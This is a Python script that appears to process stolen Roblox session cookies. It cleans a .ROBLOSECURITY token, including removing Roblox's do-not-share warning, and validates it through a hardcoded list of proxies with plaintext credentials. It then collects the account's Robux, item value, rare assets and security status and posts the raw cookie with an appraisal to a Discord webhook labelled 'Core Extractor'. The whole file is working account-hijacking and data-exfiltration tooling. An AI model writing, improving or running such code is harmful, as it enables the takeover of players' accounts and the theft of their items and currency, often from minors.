import sys
import os
import re
import time
import random
import requests
from datetime import datetime, timezone

RAW_WEBSHARE_PROXIES = [
    "45.38.107.97:6014:saxqnmup:rgvs7uvqydbm",
    "64.137.96.74:6641:saxqnmup:rgvs7uvqydbm",
    "198.23.243.226:6361:saxqnmup:rgvs7uvqydbm",
    "38.154.185.97:6370:saxqnmup:rgvs7uvqydbm",
    "84.247.60.125:6095:saxqnmup:rgvs7uvqydbm",
    "191.96.254.138:6185:saxqnmup:rgvs7uvqydbm",
    "198.46.161.42:5092:saxqnmup:rgvs7uvqydbm",
    "64.137.10.153:5803:saxqnmup:rgvs7uvqydbm",
    "104.164.49.38:7693:saxqnmup:rgvs7uvqydbm",
    "23.26.71.145:5628:saxqnmup:rgvs7uvqydbm"
]

def format_webshare(p_str):
    parts = p_str.strip().split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}", ip, port, user, pwd
    return None, None, None, None, None

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""
    raw_str = str(raw_input).strip()
    
    ps_cookie_match = re.search(r'\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    if ps_cookie_match:
        raw_str = ps_cookie_match.group(1)
    
    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    if ps_match:
        raw_str = ps_match.group(1)

    if (raw_str.startswith('"') and raw_str.endswith('"')) or (raw_str.startswith("'") and raw_str.endswith("'")):
        raw_str = raw_str[1:-1].strip()
    if raw_str.startswith(".ROBLOSECURITY="):
        raw_str = raw_str[len(".ROBLOSECURITY="):].strip()
        
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if raw_str.startswith(warning_text):
        raw_str = raw_str[len(warning_text):].strip()
    
    cleaned = raw_str.lstrip('.').rstrip(';').strip()
    if len(cleaned) < 30:
        return None
        
    return cleaned

def get_working_session(roblosecurity):
    session = requests.Session()
    session.headers.update({
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7",
        "Connection": "close",
        "Content-Type": "application/json",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36"
    })

    formatted_list = [format_webshare(p)[0] for p in RAW_WEBSHARE_PROXIES if format_webshare(p)[0]]
    random.shuffle(formatted_list)

    for p in formatted_list:
        if not p:
            continue
        try:
            session.proxies = {"http": p, "https": p}
            if roblosecurity:
                session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com", path="/")
            
            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
            if test_res.status_code == 200:
                return session
        except Exception:
            continue

    session.proxies = {}
    if roblosecurity:
        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com", path="/")
        
    return session

def main():
    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    if not webhook_url:
        sys.exit(1)

    raw_input_data = sys.stdin.read()
    if not raw_input_data:
        sys.exit(0)

    raw_cookie = extract_and_clean_cookie(raw_input_data)
    if not raw_cookie:
        sys.exit(0)

    print("[+] Validating session...")
    session = get_working_session(raw_cookie)

    auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
    if auth_res.status_code != 200:
        sys.exit(1)
    
    auth_data = auth_res.json()
    user_id = auth_data.get("id")
    if not user_id:
        sys.exit(1)

    username = auth_data.get("name", "Unknown")
    display_name = auth_data.get("displayName", username)

    def safe_get(url, params=None):
        try:
            r = session.get(url, params=params, timeout=5)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return {}

    user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}")
    created = user_info.get("created", "")
    age_days = 0
    created_dt = None
    if created:
        try:
            created_dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
            age_days = (datetime.now(timezone.utc) - created_dt).days
        except Exception:
            pass

    robux_res = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency")
    robux = robux_res.get("robux", 0)

    trans_res = safe_get(
        f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
        params={"transactionType": "summary", "timeFrame": "Year"}
    )
    pending = trans_res.get("pendingRobuxTotal", 0)

    limiteds = []
    cursor = ""
    page_count = 0
    while page_count < 2:
        params = {"limit": 100}
        if cursor:
            params["cursor"] = cursor
        r = safe_get(
            f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
            params=params
        )
        if not isinstance(r, dict):
            break
        for item in r.get("data", []):
            limiteds.append(item.get("recentAveragePrice", 0))
        cursor = r.get("nextPageCursor")
        page_count += 1
        if not cursor:
            break

    rap = sum(limiteds)

    try:
        prem_res = session.get(
            f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
            timeout=5
        )
        premium = prem_res.json() is True
    except Exception:
        premium = False

    def check_bundle(bundle_id):
        try:
            r = session.get(
                f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned",
                timeout=5
            )
            return r.json() is True
        except Exception:
            return False

    def check_asset(asset_id):
        try:
            r = session.get(
                f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}/is-owned",
                timeout=5
            )
            return r.json() is True
        except Exception:
            return False

    korblox = check_bundle(192)
    headless = check_bundle(201)
    violet_valk = check_asset(799742571)

    email_ver = safe_get("https://accountsettings.roblox.com/v1/email").get("verified", False)
    twofa = safe_get("https://twostepverification.roblox.com/v1/metadata").get("twoStepVerificationEnabled", False)

    def check_played(universe_id):
        r = safe_get(f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 100})
        if isinstance(r, dict):
            for badge in r.get("data", []):
                if badge.get("awardingUniverse", {}).get("id") == universe_id:
                    return True
        return False

    adopt_played = check_played(383310974)
    mm2_played = check_played(142823291)
    ps99_played = check_played(3259657279)

    friends_count = safe_get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count").get("count", 0)
    followers_count = safe_get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count").get("count", 0)
    following_count = safe_get(f"https://friends.roblox.com/v1/users/{user_id}/followings/count").get("count", 0)
    badges_data = safe_get(f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 10})
    badges_count = len(badges_data.get("data", [])) if isinstance(badges_data, dict) else 0

    bio_text = user_info.get("description", "")
    bio_quote = f"> {bio_text.replace(chr(10), chr(10) + '> ')}" if bio_text else "> *No bio provided.*"

    total_worth = robux + rap
    headshot_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
    render_url = f"https://www.roblox.com/bust-thumbnail/image?userId={user_id}&width=420&height=420&format=png"

    years = age_days // 365
    months = (age_days % 365) // 30
    age_formatted = f"{years}y {months}m ({age_days:,} days)" if years > 0 else f"{age_days:,} days"
    created_unix = int(created_dt.timestamp()) if created_dt else int(time.time())

    if rap >= 50000 or age_days > 1825:
        tier_rating = "⭐ Elite Account • High Value"
    elif rap >= 10000 or age_days > 365:
        tier_rating = "🔹 Active Account • Standard"
    else:
        tier_rating = "🔸 Newer Account • Low Stats"

    if email_ver and twofa:
        embed_color = 0x2ECC71
    elif not email_ver and not twofa:
        embed_color = 0xE74C3C
    else:
        embed_color = 0xF1C40F

    special_list = []
    if korblox: special_list.append("Korblox")
    if headless: special_list.append("Headless")
    if violet_valk: special_list.append("Violet Valk")
    special_text = " • ".join([f"`{item}`" for item in special_list]) if special_list else "None owned"

    games_list = []
    if adopt_played: games_list.append("Adopt Me")
    if mm2_played: games_list.append("MM2")
    if ps99_played: games_list.append("PS99")
    games_text = " • ".join([f"`{g}`" for g in games_list]) if games_list else "No tracked games played"

    payload = {
        "content": "@everyone",
        "username": "Core Extractor",
        "avatar_url": "https://cdn.discordapp.com/emojis/1085024250275815525.png",
        "embeds": [
            {
                "title": f"{username} {('👑' if premium else '')} {('✅' if email_ver else '')}",
                "description": f"### {tier_rating}\n{bio_quote}",
                "color": embed_color,
                "thumbnail": {"url": headshot_url},
                "image": {"url": render_url},
                "fields": [
                    {
                        "name": "📊 Financials",
                        "value": f"• **Robux:** `{robux:,}`\n• **Pending:** `{pending:,}`\n• **RAP:** `{rap:,}`\n• **Total Worth:** `{total_worth:,}`",
                        "inline": True
                    },
                    {
                        "name": "🛡️ Security",
                        "value": f"• **Email:** `{'✅' if email_ver else '❌'}`\n• **2FA:** `{'✅' if twofa else '❌'}`\n• **Premium:** `{'✅' if premium else '❌'}`",
                        "inline": True
                    },
                    {
                        "name": "👥 Socials",
                        "value": f"• **Friends:** `{friends_count:,}`\n• **Followers:** `{followers_count:,}`\n• **Following:** `{following_count:,}`",
                        "inline": True
                    },
                    {
                        "name": "📋 Account Data",
                        "value": f"• **Age:** `{age_formatted}`\n• **Joined:** <t:{created_unix}:D> (<t:{created_unix}:R>)\n• **Badges:** `{badges_count:,}`",
                        "inline": False
                    },
                    {
                        "name": "👑 Rare Assets",
                        "value": special_text,
                        "inline": False
                    },
                    {
                        "name": "⭐ Tracked Games",
                        "value": games_text,
                        "inline": False
                    }
                ],
                "footer": {
                    "text": f"Requested by {display_name}",
                    "icon_url": headshot_url
                },
                "timestamp": datetime.now(timezone.utc).isoformat()
            },
            {
                "title": "🔑 Session Cookie",
                "description": f"```text\n{raw_cookie}\n```",
                "color": 0x2B2D31,
                "footer": {"text": f"Token Length: {len(raw_cookie)} chars"}
            }
        ],
        "components": [
            {
                "type": 1,
                "components": [
                    {
                        "type": 2,
                        "style": 5,
                        "label": "Roblox Profile",
                        "url": f"https://www.roblox.com/users/{user_id}/profile"
                    },
                    {
                        "type": 2,
                        "style": 5,
                        "label": "Stats Link",
                        "url": f"https://www.rolimons.com/player/{user_id}"
                    },
                    {
                        "type": 2,
                        "style": 5,
                        "label": "Inventory",
                        "url": f"https://www.roblox.com/users/{user_id}/inventory#!/collectibles"
                    }
                ]
            }
        ],
        "allowed_mentions": {"parse": ["everyone"]}
    }

    requests.post(webhook_url, json=payload, timeout=5)

if __name__ == "__main__":
    main()
